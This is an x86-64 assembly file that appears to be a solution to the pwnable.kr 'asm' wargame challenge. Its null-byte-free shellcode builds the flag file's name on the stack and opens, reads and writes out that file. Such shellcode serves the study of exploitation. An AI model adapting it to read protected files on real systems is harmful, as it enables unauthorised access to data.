.section .text
.global _start

_start:

movq $0x11676e6f306f306f, %rbx
shl $0x8, %rbx
shr $0x8, %rbx
pushq %rbx
movq $0x306f306f306f306f, %rbx
pushq %rbx
movq $0x3030303030303030, %rbx
pushq %rbx
movq $0x303030306f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f3030303030, %rbx
pushq %rbx
movq $0x3030303030303030, %rbx
pushq %rbx
movq $0x3030303030303030, %rbx
pushq %rbx
movq $0x303030306f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6f6f6f6f6f6f6f6f, %rbx
pushq %rbx
movq $0x6c5f797265765f73, %rbx
pushq %rbx
movq $0x695f656d616e5f65, %rbx
pushq %rbx
movq $0x6c69665f6568745f, %rbx
pushq %rbx
movq $0x7972726f732e656c, %rbx
pushq %rbx
movq $0x69665f736968745f, %rbx
pushq %rbx
movq $0x646165725f657361, %rbx
pushq %rbx
movq $0x656c705f656c6966, %rbx
pushq %rbx
movq $0x5f67616c665f726b, %rbx
pushq %rbx
movq $0x2e656c62616e7770, %rbx
pushq %rbx
movq $0x5f73695f73696874, %rbx
pushq %rbx  ; string -> this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong

mov $0x11111102, %rax
shl $0x38, %rax
shr $0x38, %rax ; $0x11111102 -> $0x00000002
movq %rsp, %rdi
xor %rsi, %rsi
syscall     ; open(%rdi, %rsi) syscall(%rax)

movq %rax, %rbx

xor %rax, %rax
movq %rbx, %rdi
movq %rsp, %rsi
movq $0x11111143, %rdx
shl $0x38, %rdx
shr $0x38, %rdx ; $0x11111143 -> $0x00000043
syscall     ; read(%rdi, %rsi, %rdx) syscall(%rax)

mov $0x11111101, %rax
shl $0x38, %rax
shr $0x38, %rax ; $0x11111101 -> $0x00000001
mov $0x11111101, %rdi
shl $0x38, %rdi
shr $0x38, %rdi ; $0x11111101 -> $0x00000001
movq %rsp, %rsi
movq $0x11111143, %rdx
shl $0x38, %rdx
shr $0x38, %rdx ; $0x11111143 -> $0x00000043
syscall     ; write(%rdi, %rsi, %rdx) syscall(%rax)
